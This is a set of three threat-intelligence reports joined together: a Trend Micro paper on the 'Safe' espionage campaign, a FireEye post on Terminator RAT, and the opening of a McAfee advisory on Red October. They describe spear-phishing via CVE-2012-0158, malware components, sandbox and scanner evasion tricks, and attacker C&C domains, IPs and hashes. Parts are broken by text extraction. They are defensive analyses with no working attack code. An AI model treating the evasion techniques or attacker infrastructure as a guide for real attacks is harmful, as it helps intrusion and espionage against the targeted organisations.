in connection with the use of this document, or any errors or omissions in the content
thereof.Use of this information constitutes acceptance for use in an “as is” condition.</section>
<section>
Introduction
Whether considered advanced persistent threats (APTs) or malware-based
espionage attacks, successful and long-term compromises of high-value
organizations and enterprises worldwide by a consistent set of campaigns
cannot be ignored.Because “noisier” campaigns are becoming increasingly
well-known within the security community, new and smaller campaigns are
beginning to emerge.This research paper documents the operations of a campaign we refer to as
“Safe,” based on the names of the malicious files used.It is an emerging and
active targeted threat.Note that any mention of “SafeNet” in this paper is completely unrelated
to and has no association with SafeNet, Inc., a global leader in data
protection and a valued partner of Trend Micro.The author of the Safe
malware apparently maliciously used the word “SafeNet” as part of this
viral campaign, and to the extent the word “SafeNet” appears in this
paper, it appears solely as replicated in the attacking author’s malware
configuration.There is no correlation between SafeNet Inc. and the Safe
campaign and should not be interpreted as such.The Safe campaign was able to compromise the following types of
organizations:

 •	 Government ministries                  •	 Academic research institutions

 •	 Technology companies                   •	 Nongovernmental organizations

 •	 Media outlets

While we have yet to determine the campaign’s total number of victims, it
appears that nearly 12,000 unique IP addresses spread over more than
100 countries were connected to two sets of command-and-control (C&C)
infrastructures related to Safe.We also discovered that the average number of
actual victims remained at 71 per day, with few if any changes from day to day.This indicates that the actual number of victims is far less than the number of
unique IP addresses.Due to large concentrations of IP addresses within specific
network blocks, it is likely that the number of victims is even smaller and that
they have dynamically assigned IP addresses, which have been compromised
for some time now.Investigating targeted campaigns involves more than simply collecting
actionable indicators like malware samples and C&C server information.Investigating and monitoring the activities of the Safe campaign over time, we
were able to take advantage of the mistakes the attackers made and thus gain
a deeper understanding of their operations.One of the C&C servers was set
up in such a way that the contents of the directories were viewable to anyone
who accessed them.As a result, not only were we able to determine who the
campaign’s victims were, but we were also able to download backup archives
that contained the PHP source code the attackers used for the C&C server and
the C code they used to generate the malware used in attacks.<footer> PAGE 1 | Safe: A Targeted Threat </footer>
                                   The author of the malware used in the campaign is probably a professional
                                   software developer who studied at a technical university in China.This individual
                                   appears to have repurposed legitimate source code from an Internet services
                                   company in the same country for use as part of the campaign’s C&C server
                                   code.As such, this may be a case in which a malware entrepreneur’s code was
                                   used in targeted attacks.In addition to understanding the tools and techniques used in this campaign,
                                   we had the opportunity to analyze the data to determine its source.While the
                                   information that we obtained suggested the identity of the malware author, we
                                   were not able to attribute the campaign operation to him.In fact, while we were
                                   able to identify the various IP addresses used by the operators, the geographic
                                   diversity of the proxy servers and VPNs made it difficult to determine their true
                                   origin.</section><section>
                                   <heading>Attack Vector</heading>
                                   The distribution mechanism the
                                   Safe campaign used involved spear-
                                   phishing emails that contain a
                                   malicious attachment.</section>
<section>

<heading>
Malware</heading>

First Stage
Opening the malicious document on a system running a vulnerable version of
Microsoft Office opens the decoy document for the user to view.Note though
that this also drops malicious files onto the system that allows the attackers to
take control of it.After the initial compromise, the attackers may then steal files
from the compromised system.The decoy document, NBC Interview_Excerpts.doc, has the MD5 hash,
a2da9cda33ce378a21f54e9f03f6c0c9efba61fa.It drops the following files:

 •	 smcs.exe (91e6277a70d48ed953ac9208275e5dc855a8f7a7), which
    contains:

      •	 SafeCredential.DAT (303e982d0929ca2c50809323dff66be38a46926a)

      •	 SafeExt.org (2029399fb4be3d88c2ba0a7544b1ebec58157639), which
         contains:

           •	 SafeExt.dll (cde35c8da8c420aeaf5adda14ba68d18010479fa)

The malware the malicious documents drop has several components, including:

 •	 SafeExt.dll: Contains the malware’s main functionality.•	 SafeCredential.DAT: Contains the RC4 key, C&C information, and
    campaign “mark.”

If User Account Control (UAC) is active, SafeExt.dll will be injected into
explorer.exe.The network
                                   traffic is encrypted with the RC4 key in
                                   SafeCredential.DAT.One key
                                   indicator that can be used to detect              <figure></figure>
                                   this network communication is the
                                   user-agent, Fantasia.Figure 4: Check in with the C&C server

                                   During our investigation of the C&C
                                   servers associated with Safe, we
                                   discovered a backup script that the                          <figure></figure>
                                   attackers used to archive the files on
                                   them.This allowed us to acquire the                  Figure 5: Safe backup script
                                   source code for the .PHP files used on
                                   the C&C servers.The data that the malware sends from
                                   a compromised host to report.php is
                                   decrypted by the C&C server and
                                   stored in a MySQL™ database.In
                                   addition to RC4 encryption use, the
                                   file’s content is XORed with the                  <figure></figure>
                                   function in Figure 6.The parameters of the query are
                                   unpacked and sent to a function that         Figure 6: Safe’s VisualEncrypt function
                                   inserts the information the
                                   compromised host provides into the MySQL database.It then checks
                                   the database to see if the attackers specified instructions to send to the
                                   compromised host.If there are, these instructions are sent back to the
                                   compromised host.<figure></figure>
                                                              Figure 7: Safe’s check-in function



<footer>
PAGE 4 | Safe: A Targeted Threat</footer>
The REQUEST_TYPE_CLIENT_REQUEST function inserts a unique ID for
each compromised host as well as the Internet and external IP addresses,
hostname, Windows domain, the system’s disc drive information, and a
campaign mark.It has a field to store information about any additional malware
plug-ins that have been installed on the system.The tools that we discovered were
located on the same C&C servers.Plug-Ins
The data contained in the C&C servers references plug-ins that are available
for the malware.We believe they are related to the malware’s data-exfiltration
capabilities.The names of the plug-ins are:

 •	 OpenDoc

 •	 UsbDoc

 •	 UsbExe


Tools
The tools used by Safe are off-the-shelf programs that are able to extract saved
passwords from Internet Explorer® (IE) and Mozilla Firefox® as well as any
stored Remote Desktop Protocol (RDP) credentials.<fn>4</fn>



<footnote>
4	   The tools are publicly available at http://www.nirsoft.net/.The first
                                   set of C&C servers had Mongolian-themed domain names—mongolbaatar.us and mongolbaatarsonin.in.The second set of C&C servers use the
                                   domains, getapencil.com, which was registered with a privacy protection
                                   service, and withoutcake.com, which was registered by wanxian@126.
                                   com.<fn>5</fn> Willyoumarryadog.com may also be a C&C server but we have not yet
                                   discovered samples that use this domain name.<figure></figure>
                                                               Figure 9: Safe C&C server infrastructure

                                   The Tibetan- and Mongolian-themed attack vectors described earlier are
                                   connected to the first infrastructure (i.e., mongolbaatar).We were unable to
                                   discover attack vectors for the second C&C infrastructure.<footnote>
                                   5	   A variety of services can be used so the registrant information required to register a domain
                                        name will not be publicly visible in the WHOIS directory.</footnote>


<footer>
PAGE 6 | Safe: A Targeted Threat</footer>
</section>
<section>
<heading>
Campaign Connections</heading>
One of the C&C servers used, withoutcake.com, was registered using the
email address, wanxian@126.com.This email address has been used to
register 17 domain names, five of which have been confirmed to be C&C
servers.<figure></figure>

                         Figure 10: Connections to other campaigns

The domain, sugarsbutters.com, was used in attacks that leveraged images of
Russian model, Irina Shayk, and dropped the iMuler malware that affects Mac
OS X systems in November 2012.<fn>6</fn> Three domains—aq5u.org, prettyb0yinus.com, and shumetheme.org—have also been used as C&C servers for
campaigns using the Enfal malware.<fn>7</fn>

</section>
<section>
<heading>
Identification of Victims</heading>
We were able to identify victims in two ways.First, we were able to download
a list of victims that were currently online from the C&C servers.Second, we
were also able to download logs from the C&C servers that listed all of the IP
addresses that “checked in” to them using the REQUEST_TYPE_CLIENT_
REQUEST function.The first set of C&C servers (i.e., mongolbataar) appeared to have only three
“live” victims—one with an IP address assigned to South Sudan, another with
an address assigned to Mongolia, and another that did not list an external IP
address.The logs we obtained from the first set of C&C servers showed that 243 unique
IP addresses from 11 different countries checked in to them.<footnote>
6	   http://www.totaldefense.com/blogs/2012/04/11/mac-os-x-threat-masquerading-as-image-files.aspx and http://www.f-secure.com/v-descs/backdoor_osx_imuler_a.shtml
7	   http://www.sophos.com/en-us/threat-center/threat-analyses/viruses-and-spyware/
     Troj~Luiha-BK/detailed-analysis.aspx and http://www.threatexpert.com/report.com) showed that 11,563 unique IP addresses from 116 different countries
                                   checked in to them.The actual total victim count was significantly lower
                                   than the number of unique IP addresses though.<footer>
PAGE 8 | Safe: A Targeted Threat</footer>
</section>
<section>
<heading>
Tools</heading>
A closer look at the C&C servers allowed us to identify the tools and source
code the threat actors used to create, distribute, and encrypt/decrypt data.The
tools presented in this section either came preassembled or could be compiled
using the source code that could be downloaded from the getapencil.com C&C
server.TypeConfig/SafeDisk
The primary function of TypeConfig/SafeDisk appears to be embedding a
backdoor into a valid .PE file.This tool appears to be the primary method for
creating the malware related to the campaign.</section>
<section>
<heading>
                                    DECRYPT.exe</heading>
                                    We also pulled the application,
                                    DECRYPT.exe, from a getapencil.com C&C server.This application is a
                                    custom encrypter/decrypter for any file
                                    inputted into the application.We were able to identify victim files                       <figure></figure> 
                                    that were on “drop servers” that utilize         Figure 14: Password validation box that
                                    DECRYPT.exe for encryption/                    appears when the Decrypt button is pressed
                                    decryption.</section>
<section>
<heading>
                                    Common Tools</heading>
                                    We also identified security tools with both valid and nefarious purposes and
                                    have been used in other campaigns on the C&C servers.We listed some of
                                    these along with their functionality below:

                                     •	 LZ77: Used to compress and decompress files.•	 UPXShell: Commonly used to pack malware in order to make it more
                                        difficult for analysts to reverse-engineer.•	 DebugView: A Microsoft Sysinternals tool that allows you to monitor debug
                                        outputs on your local system.•	 Build.bat: Used to open TypeConfig and “automate” malware creation
                                        processes.•	 Compress.bat: Used to automatically compress files defined in a batch file
                                        with the aid of LZ77.exe.•	 PECompress.bat: Used to compress files identified in a batch file with the
                                        aid of UPXShell.exe.<footnote>
                                    8	   http://www.math.sci.hiroshima-u.ac.jp/~m-mat/MT/MT2002/CODES/readme-mt.txt
</footnote>


<footer>
PAGE 10 | Safe: A Targeted Threat</footer>
</section>
<section>
<heading>
Source Code</heading>
This section shows some of the discoveries we made while trying to identify the
functionality and use cases of each application we discovered.Nearly all of the
samples were coded in C, specifically Visual C.

The directory structure of the source code appeared to be standard of
directories written using C, Visual Studio® Express, or a litany of other tools.The code appeared to be very robust.We created a complete mind map of the
code, its directories and the files located within the said directories.<fn>9</fn>


<figure></figure>

                Figure 15: High-level directory/code structure of our findings

The applications in the following section are only a few of those that contained
some of the most interesting details about our findings.<footnote>
9	   Due to the number and depth of directories discovered, what has been included here is only a
     portion of the mind map we created.While reverse-
                                    engineering code and functionality, we                      <figure></figure>
                                    discovered that the two applications           Figure 17: Code identifying SafeDisk.exe
                                    were identical in function.We have not, however, ascertained what the purpose
                                    behind differential naming is, but their functionality appeared to be very similar.We also identified fields in
                                    TypeConfig.exe by directly correlating
                                    the code to the fields within the GUI.Another interesting feature to note
                                    within TypeConfig.exe is its use of
                                    SafeCredential.DAT, which the threat
                                    actors created to specify the RC4
                                    encryption key, C&C server
                                    information, and campaign mark.The code required config.php,
which contained the configuration for
the MySQL database where victim
information was stored; global.php,
which contained some mapping of
strings to command numbers; upload.php, which provided the functionality
for data exfiltration; and utils.php,
which contained the encryption
functions in order to encrypt and
decrypt communications between a                   <figure></figure>
compromised host and a C&C server.Compromised hosts and malicious
operators interacted with record.php,             Figure 21: Safe commands
the primary file required for C&C operation.The utils directory also contained
code for extensive logging and what appeared to be repurposed legitimate code.When compromised computers accessed record.php, they interacted with the
functionality labeled CLIENT.Operators used MANAGE commands to interact
with the C&C functionality.</section>
<section>
<heading>
Attribution</heading>
Identifying who is responsible for targeted attacks is not an easy task.The term
“attribution” is applied to everything, ranging from individuals to governments.The technical indicators often used to determine attribution like domain name
registration data and geographic locations of IP addresses can be easily
falsified.Modern attackers often use “hop” points that consist of compromised
systems as well as proxy servers and VPNs to disguise their origin.It is trivial
to purchase virtual private servers (VPSs) in just about any country, and
determining who ultimately benefits from the spoils of targeted attacks is often a
matter of interpretation based on geopolitics with limited exploration of possible
alternative explanations.<footer>                        PAGE 13 | Safe: A Targeted Threat</footer>
                                    The technical indicators used to attribute attacks vary, depending on what is
                                    being analyzed.In some cases, the term “attribution” is used to refer to the
                                    developers of either the exploits or malware payloads.They could very well be
                                    completely different threat actors.The term is also used to refer to identify the
                                    providers of C&C infrastructures used in targeted attacks, particularly those that
                                    registered the domain names.It can also refer to obtaining specific information
                                    about the campaign operators who launch attacks and operate the C&C
                                    infrastructure.This paper presents some of the technical evidence we discovered during our
                                    investigation.We focused on two threat actor types—developers and operators.We were able to uncover clues that indicate the identity of the malware author
                                    that were left in the source code as well as through open source analysis.We
                                    were able to obtain limited insights into the activities of the C&C operators
                                    through the logs they collected, which recorded the IP addresses they used to
                                    operate and manage the C&C servers.</section>
<section>
         <heading>                           Developers</heading>
                                    Throughout much of the code, we saw
                                    indications of its origin.For instance,
                                    when looking at the code for the file,
                                    TypeConfig.vcproj.INTERNAL.In addition to the language used, we
                                    found that the malware author used
                                    a name in several places throughout
                                    the source code.For instance, under
                                    the directory, Src>TypeConfig>, we
                                    noticed an interesting .vcproj file called              <figure></figure>
                                    “TypeConfig.vcproj.INTERNAL.<footnote>

                                    10	 http://en.wikipedia.org/wiki/GB_2312
</footnote>


<footer>
PAGE 14 | Safe: A Targeted Threat</footer>
<figure></figure>
              Figure 24: TypeConfig’s source code with author information

We found the string, “CompanyName,” in the C source code that contains
the same name as the development machine’s.The PHP code used as the
C&C server’s back end contained a copyright notice that matches the author’s
name in the C code as well as an email address/QQ number that matches the
“CompanyName” in the C code.<figure></figure>
     Figure 25: Copyright notice containing a name and an email address/QQ number

The email address was used to register a domain name for a personal blog
about software development with a Beijing street address.We also found the
same name and email address used by an author of an academic paper at
a technical university in China.Posts on this individual’s personal blog also
indicate a relationship with the same university, including the development of
some legitimate software.Figure 26: Repurposed source code
                                    We also found legitimate code that
                                    appears to have been developed by an
                                    Internet services company used as
                                    part of the C&C panel.This code was
                                    not developed by the same person that
                                    we believe developed the Safe malware          <figure></figure>
                                    but appears to simply have been reused.Figure 27: SVN repository with user name
                                    We believe though that
                                    this code is not publicly available.In the code’s archive we recovered from the C&C servers, we found a .csv
                                    directory that contains an entries file that contains the location of the repository
                                    as well as the time, version, and user name of the person who last committed
                                    the source code.The author information indicates that the malware author
                                    checked the code in to the Internet services company’s private SVN repository.It appears that the malware author has been repurposing the code for his own
                                    malware project.We believe the malware author is a professional software engineer that is
                                    familiar with version control.We also found indicators that this individual is
                                    proficient in software development due to the high quality of the source code he
                                    used.The entire source code was explicitly written with future development in
                                    mind.It was modularized and heavily commented on in a way that allows further
                                    development even by several engineers.These qualities are traditionally seen
                                    in the work of professional software engineers that have been taught traditional
                                    computer science.Apart from being significantly well-organized and well-commented, the code
                                    was also developed with defensive programming in mind.Each of the variables
                                    was named in a very obvious manner, helping other engineers easily distinguish
                                    functionality; again, a trait seen in the work of many professional software
                                    engineers.In addition to being heavily commented on and using intuitive
                                    variable naming conventions, the code also had an apparent slant toward
                                    usability.Each interface was very intuitive and well-designed, something not
                                    often seen in the code of a hobbyist.The use of terms like “bot,” combined with the author’s posting of the malware
                                    code to code-sharing sites, indicate a degree of familiarity with the cybercriminal
                                    underground in China.We have not, however, uncovered evidence that links the
                                    malware author with the campaign’s operators.</section>
<section>
<heading>

                                    Operators</heading>
                                    We were unable to obtain information beyond IP addresses that indicate the
                                    origin of those issuing MANAGE or other C&C requests.The extensive logging
                                    performed by the C&C servers, however, allowed us to differentiate between the
                                    victims’ and operators’ IP addresses.</section>
<section>
<heading>
Conclusion</heading>
Ongoing cyber-espionage campaigns have been successfully infiltrating targets
worldwide, many of which have been active for years.However, the amount
of public exposure, especially of noisier and larger campaigns, has been
increasing.Perhaps due to their success, these campaigns’ operators intensified
their operations, causing them to be increasingly visible.But smaller campaigns
are beginning to emerge; these use small clusters of C&C servers and new
malware as well as attack fewer targets.While determining the intent and identity of the attackers often remains difficult
to ascertain, we determined that the Safe campaign is targeted and uses
malware developed by a professional software engineer that may be connected
to the cybercriminal underground in China.This individual studied at a prominent
technical university in the same country and appears to have access to an
Internet services company’s source code repository.This individual developed
malware that was, in turn, used for targeted attacks leveraging two distinct sets
of C&C infrastructure.<footer>                                   PAGE 17 | Safe: A Targeted Threat</footer>
                                    As the tools used in targeted attacks are exposed, attackers may look for new
                                    custom malware to circumvent defenses.As a result, attackers may increasingly
                                    look to the cybercriminal underground for new malicious tools instead of
                                    developing their own tools for exclusive use.These developments highlight the
                                    increasing need for ongoing investigation and monitoring of such threats.While
                                    indicators that can be directly incorporated into defensive operations remain
                                    important, in-depth qualitative analysis of particular campaigns can provide
                                    critical insights into attackers’ operations.Furthermore, attribution should not
                                    be entirely based on the common use of tools and infrastructure, as these are
                                    increasingly not being developed and used exclusively by particular sets of
                                    threat actors.</section>
<section>
<heading>
                                    Defending Against Targeted
                                    Attacks</heading>
                                    Sufficiently motivated threat actors can penetrate even networks that use
                                    moderately advanced security measures.As such, apart from standard
                                    and relevant attack prevention measures and mechanisms like solid patch
                                    management; endpoint and network security; firewall use; and the like,
                                    enterprises should also focus on detecting and mitigating attacks.Moreover,
                                    data loss prevention (DLP) strategies that identify the data an organization is
                                    protecting and take into account the context of data use should be employed.</section>
<section>
<heading>
                                    Local and External Threat Intelligence</heading>
                                    Threat intelligence refers to indicators that can be used to identify the tools,
                                    tactics, and procedures threat actors engaging in targeted attacks use.Both
                                    external and local threat intelligence is crucial for developing the ability to detect
                                    attacks early.•	 Performing integrity checks: In order to maintain persistence, malware
                                        will make modifications to the file system and registry.Monitoring such
                                        changes can indicate the presence of malware.•	 Empowering the human analyst: Humans are best positioned to identify
                                        anomalous behaviors when presented with a view of aggregated logs from
                                        across a network.This information is used in conjunction with custom alerts
                                        based on the local and external threat intelligence available.Technologies available today like Deep Discovery provide visibility, insight, and
                                    control over networks to defend against targeted threats.<fn>11</fn> Deep Discovery
                                    uniquely detects and identifies evasive threats in real-time and provides in-depth
                                    analysis and actionable intelligence to prevent, discover, and reduce risks.<footnote>
                                    11	 http://www.trendmicro.com/us/enterprise/security-risk-management/deep-discovery/index.html
</footnote>


<footer>
PAGE 18 | Safe: A Targeted Threat</footer>
</section>
<section>
<heading>
Mitigation and Cleanup Strategy</heading>
Once an attack is identified, the cleanup strategy should focus on the following
objectives:

 •	 Determine the attack vector and cut off communications with the C&C
    server.•	 Determine the scope of the compromise.•	 Assess the damage by analyzing the data and forensic artifacts available on
    compromised machines.Remediation should be applied soon afterward, which includes steps to fortify
affected servers, machines, or devices into secure states, informed in part by
how the compromised machines were infiltrated.</section>
<section>
<heading>
Educating Employees Against Social
Engineering</heading>
Security-related policies and procedures combined with education and training
programs are essential components of defense.Traditional training methods
can be fortified by simulations and exercises using real spear-phishing attempts
sent to test employees.Employees trained to expect targeted attacks are better
positioned to report potential threats and constitute an important source of threat
intelligence.</section>
<section>
<heading>
Data-Centric Protection Strategy</heading>
The ultimate objective of targeted attacks is to acquire sensitive data.As such,
DLP strategies that focus on identifying and protecting confidential information
are critical.Enhanced data protection and visibility across an enterprise
provides the ability to control access to sensitive data as well as monitor and
log successful and unsuccessful attempts to access it.Enhanced access
control and logging capabilities allow security analysts to locate and investigate
anomalies, respond to incidents, and initiate remediation strategies and damage
assessment.</section>
<section>
<heading>
Trend Micro Threat Protection
Against the Safe Campaign</heading>
Part of processing and identifying the components of the Safe campaign is
creating a list of indicators of compromise (IOCs) to help organizations better
identify and locate certain tools, malware, and traffic patterns that could indicate
compromise.<footer>   PAGE 19 | Safe: A Targeted Threat</footer>
The following table summarizes the Trend Micro solutions for the components of the Safe campaign.Trend Micro
recommends a comprehensive security risk management strategy that goes further than advanced protection to meet the
real-time threat management requirements of dealing with targeted attacks.<table>
              Attack Component                              Protection Technology             Trend Micro Solution
Network traffic identifiers:                                                        •	Endpoint (Titanium, Worry-Free Business
 •	Network traffic going to mongolbaatarsonin.Troj~Luiha-BK/detailed-analysis.aspx
                                          cgi?name=CVE-2012-0158                          •	http://www.threatexpert.com/report.aspx?Unlike indiscriminate
  cybercrime attacks, spam, web threats, and the like, targeted attacks are much harder to detect because of the
  nature of related components and techniques.SAFE


•	 First Seen
Individual targeted attacks are not one-off attempts.Attackers continually try to get inside the target’s network.The Safe campaign was first seen on October 2012.•	 Victims and Targets
Targeted threats target specific industries or communities of interest in specific regions.The Safe campaign was able to compromise government ministries, technology companies, media outlets, academic research institutions, and
nongovernmental organizations.Furthermore, it was discovered that the average number of actual victims remained at 71 per day, with few if any changes from day to day.•	 Operations
First-stage computer intrusions often use social engineering.Attackers custom-fit attacks to their targets.The Safe campaign attackers used spear-phishing emails with malicious attachments.Attackers used several malicious documents that all exploited a
Microsoft Office® vulnerability (i.e., CVE-2012-0158).If opened with a version of Microsoft Word® that is not up-to-date, a malicious payload is silently
installed on the user’s computer.In addition, one of the C&C servers used in the Safe campaign was set up in such a way that the contents of the directories were viewable to anyone
who accessed them.•	 Possible Indicators of Compromise
Attackers want to remain undetected as long as possible.A key characteristic of targeted attacks is stealth.Below is a list of the components of the Safe campaign.<list>
     Network traffic identifiers:                          Host-based identifiers:                              Malware files:
      »» Network traffic going to mongolbaatarsonin.a world safe for exchanging digital information with its Internet                        Cupertino, CA 95014
content security and threat management solutions for businesses
                                                                                         U.S. toll free: 1 +800.228.5651
and consumers.Powered by the Trend Micro™ Smart Protection
Network™ infrastructure, our industry-leading cloud-computing
security technology, products and services stop threats where
they emerge, on the Internet, and are supported by 1,000+ threat
intelligence experts around the globe.For additional information,
visit www.trendmicro.com.©2013 by Trend Micro, Incorporated.All rights reserved.Trend Micro and the Trend Micro t-ball logo are trademarks or registered trademarks of Trend Micro, Incorporated.All
other product or company names may be trademarks or registered trademarks of their owners.</section>
</doc><doc>
<section>
<heading>Evasive Tactics: Terminator RAT</heading>
FireEye Labs has been tracking a variety of advanced persistent threat (APT) actors that have been
slightly changing their tools, techniques, and procedures (TTPs) in order to evade network
defenses.Earlier, we documented changes to Aumlib, the malware used in the attack against the
New York Times, and Taidoor, a malware family that is being used in ongoing cyber-espionage
campaigns particularly against entities in Taiwan.In this post we will explore changes made to
Terminator RAT (Remote Access Tool) by examining a recent attack against entities in Taiwan.We recently analyzed a sample that we suspect was sent via spear-phishing emails to targets in
Taiwan.As shown in Figure 1, the adversary sends a malicious Word document, “103.doc” (md5:
a130b2e578d82409021b3c9ceda657b7), that exploits CVE-2012-0158, which subsequently drops a
malware installer named “DW20.exe”.This particular malware is interesting because of the
following:
      It evades sandbox by terminating and removing itself (DW20.exe) after installing.Malicious
      behavior will only appear after reboot.It deters single-object based sandbox by segregation of roles between collaborating malwares.The RAT (svchost_.exe) will collaborate with its relay (sss.exe) to communicate with the
      command and control server.It deters forensics investigation by changing the startup location.It deters file-based scanning that implements a maximum file size filter, by expanding the size
      of svchost_.exe to 40MB.The ultimate payload of the attack is Terminator RAT, which is also known as FakeM RAT.This
RAT does not appear to be exclusively used by a single APT actor, but is most likely being used in a
variety (of possibly otherwise unrelated) campaigns.In the past, this RAT has been used against
Tibetan and Uyghur activists, and we are seeing an increasing number of attacks targeting Taiwan
as well.However, these attacks use some evasive tactics that demonstrate the evolution of Terminator RAT.First, the attackers have included a component that relays traffic between the malware and a proxy
server.Second, they have modified the 32-byte magic header that in previous versions attempted to
disguise itself to look like either MSN Messenger, Yahoo!Messenger, or HTML code.These modifications appear to be an attempt to evade network defenses, perhaps in response to
defender’s increasing knowledge of the indicators of compromise associated with this malware.We
will discuss the individual components of this attack in more detail.</section>


<figure></figure>    <caption>Figure 1</caption>


<section>
<heading>1.DW20.exe (MD5: 7B18E1F0CE0CB7EEA990859EF6DB810C)</heading>

DW20.exe was found to be the installation executable file.It will first create its working folders
located at “%UserProfile%\Microsoft” and “%AppData%\2019”.The former is used to store the
configurations and executable files (svchost_.exe and sss.exe) and the latter is used to store the
shortcut link files.This folder “2019” was then configured to be the new start up folder location by
changing the registry
“HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell
Folders\Startup” with the location of its path (see Figure 2).</section>

<figure></figure>    <caption>Figure 2</caption>

<section>
The executable file “sss.exe” was found to be the decrypted form of the resource named 140 with
type “ACCELORATOR” (likely misspelling of Accelerator – see Figure 3).This resource was
decrypted using customized XTEA algorithm and appended with an encrypted configuration for the
domains and ports.</section>


<figure></figure>    <caption>Figure 3</caption>

<section>
After installation, DW20.exe deletes and terminates itself.The malwares will only run after reboot.This is one effective way to evade sandbox automatic analysis, as malicious activity will only reveal
after a reboot.<heading>2.sss.exe (MD5: 93F51B957DA86BDE1B82934E73B10D9D)</heading>

sss.exe is an interesting malware component.As a researcher would analyze it independently, it is
not considered a malicious program.This component plays the role as a network relay between the
malware and the proxy server, by listening over port 8000.To achieve this, it first tries to identify
the list of proxy servers that are used within the system using
“WinHttpGetIEProxyConfigForCurrentUser”, and the discovered proxy servers and related ports
are stored in the same directory in a file named “PROXY” (see Figure 4).</section>


<figure></figure>    <caption>Figure 4</caption>

<section>
When there is a new incoming TCP connection over port 8000, it will attempt to create a local to
proxy socket connection.With that, it will check connectivity with the CnC server.If the response is
200, it will then start to create a “relay link” between the malware and the CnC server (see Figure
5).The “relay link” was created using two threads, where one thread will transfer data from socket 1
to socket 2 (see Figure 6) and the other will do vice versa.</section>

<figure></figure>    <caption>Figure 5</caption>

<figure></figure>    <caption>Figure 6</caption>

 
<section>
As depicted in Figure 7, the user agent is hard coded.It is a possible means to identify potentially
 malicious traffic, as Internet Explorer 6 is significantly outdated and “MSIE 6.0.1.3” is not a valid
                                            version token.</section>

<figure></figure>    <caption>Figure 7</caption>

<section>
 The configurations for the malicious domains and ports to use are located at the last 188 bytes of
    the executable file (see Figure 8).The first 16 bytes is the key (boxed in red) to decrypt the
  remaining content using modified XTEA algorithm (see Figure 9).The two malicious domains
                 found were “liumingzhen.zapto.org” and “liumingzhen.myftp.org”
</section>

<figure></figure>    <caption>Figure 8</caption>

<figure></figure>    <caption>Figure 9</caption>

<section>
<heading>3.Network Traffic</heading>

The Terminator sample we analyzed, “103.doc” (md5: a130b2e578d82409021b3c9ceda657b7) was
not configured with fake HTML, Yahoo Messenger, or Windows Messenger traffic header as it had
in past variants.However, the content is encrypted in exactly the same way as previous versions of
Terminator RAT.</section>

<figure></figure>    <caption>Figure 10</caption>

<section>
The decrypted content reveals that the malware is sending back the user name, the computer name
and a campaign mark of “zjz1020”.</section>


<figure></figure>    <caption>Figure 11</caption>

<section>
This particular sample is configured to one of two command and control servers:

     liumingzhen.zapto.org / 123.51.208.69
     liumingzhen.myftp.org / 123.51.208.69

We have located another malicious document that has a Taiwan-related decoy document that drops
                              this same version of Terminator RAT.</section>

<figure></figure>    <caption>Figure 12</caption>

<section>
The sample we analyzed (md5: 50d5e73ff8a0693ed2ee2d320af3b304) exploits CVE-2012-0158
and has the following command and control server:
     catlovers.25u.com / 123.51.208.142

The command and control servers for both samples resolved to IP addresses in the same class C
network.<heading>4.Campaign Connections</heading>

In June 2013, we investigated an attack against entities in Taiwan that used spear-phishing emails
to deliver a malicious attachment.</section>


<figure></figure>    <caption>Figure 13</caption>

<section>

The malicious attachment “標案資料.doc” (md5: bfc96694731f3cf39bcad6e0716c5746) exploited a
vulnerability in Microsoft Office (CVE-2012-0158), however, the payload in this case was a different
malware family known as WinData.The malware connected to the same command and control
server, liumingzhen.zapto.org, but the callback is quite different:

XYZ /WinData.DLL?HELO-STX-1*1[IP Address]*[Computer Name]*0605[MAC:[Mac Address]]$

In a separate case where liumingzhen.zapto.org has been used as the command and control server,
the payload was neither WinData nor Terminator RAT, but another type of malware known as
Protux.The sample we analyzed in August 2012 for this case was “幹!.doc” (md5:
01da7213940a74c292d09ebe17f1bd01).This particular threat actor has access to a variety of malware families and has been using them to
target entities in Taiwan for more than a year.<heading>Conclusion</heading>

Terminator RAT is an example of how malware are increasingly becoming more sophisticated and
harder to detect.There is a need for continual research to understand various techniques, tactics,
and procedures used by the adversaries.Detection of exploitation and identification of anomalous
callbacks are becoming extremely critical in preventing the malware from installing into the system
or phoning back to the command control servers.This entry was posted in Advanced Malware, Targeted Attack, Threat Intelligence, Threat Research
by Geok Meng Ong, Nart Villeneuve and Chong Rong Hwa.Bookmark the permalink.</section>

</doc><doc>
 <cover>                                                                     McAfee Labs Threat Advisory
                                                                        Operation Red October
                                                                                                January 18, 2013
</cover>
<section>
<heading>Summary</heading>
“Red October” is a targeted attack and cyber espionage network that was discovered to be targeting Diplomatic
and Government agencies.The threats that were used in this attack campaign have been known to be active
since 2009.This targeted attack involves both MS-office and Java based exploits.The payloads used in the
exploitation are mostly backdoors and password stealers that steal the user’s information and send it in an
encrypted form to the remote attacker.Once the user opens the malicious document containing the embedded code, a malicious payload is dropped into
the system.The dropped payload in turn communicates with the C&C servers.The payload receives additional
modules from the C&C server to handle the infection on different types of devices and also could drop additional
malware.</section>

<section>
<heading>Characteristics and Symptoms</heading>

<heading>Description</heading>

There could be different combinations of Microsoft and Java exploits and payload in the wild to achieve this
attack.We have used one of the MD5s (51EDEA56C1E83BCBC9F873168E2370AF) to do this analysis, which is a
document file.The Red October campaign is known to target the following mentioned vulnerabilities:

       CVE-2012-0158 (MS Word)

       CVE-2010-3333 (MS Word)

       CVE-2009-3129 (MS Excel)

       CVE-2011-3544 (Java Rhino Script Engine Vulnerability)

The following picture clearly shows how the targeted attack happens in the Red October Campaign.<figure></figure>


<heading>Microsoft Document Exploitation (CVE-2012-0158, CVE-2010-3333, CVE-2009-3129):</heading>

The phishing email contains an attachment with the malicious office document.This file, when opened, exploits
one of the above mentioned vulnerabilities and drops the payload file “msmx21.exe”.<heading>Payload Information:</heading>

After successful exploitation of the vulnerability, the embedded executable file (msmx21.exe) is dropped in the
%temp% folder.msmx21.exe creates and executes the following files:

      %Temp%\msc.bat
      %ProgramFiles%\Windows NT\svchost.exe
      %ProgramFiles%\Windows NT\wsdktr.ltp (Encrypted payload) -> random name

The dropped batch file has the following content:

<figure></figure>


The use of “chcp 1251” in the batch file is to switch the codepage of an infected system to handle Cyrillic
characters.This might suggest that either the attack originates from Russia or was also targeted towards
government agencies in Russia.Svchost.exe is an installer component that decrypts and loads the main backdoor (wsdktr.ltp).It connects to the
following Microsoft hosts to check for a live Internet connection:

  update.microsoft.com
  www.microsoft.com
  support.microsoft.com

wsdktr.ltp is an encrypted executable file (UPX packed dll) that is decrypted and loaded into memory by
svchost.exe.<caption>Encrypted wsdktr.ltp file:</caption>

<figure></figure>


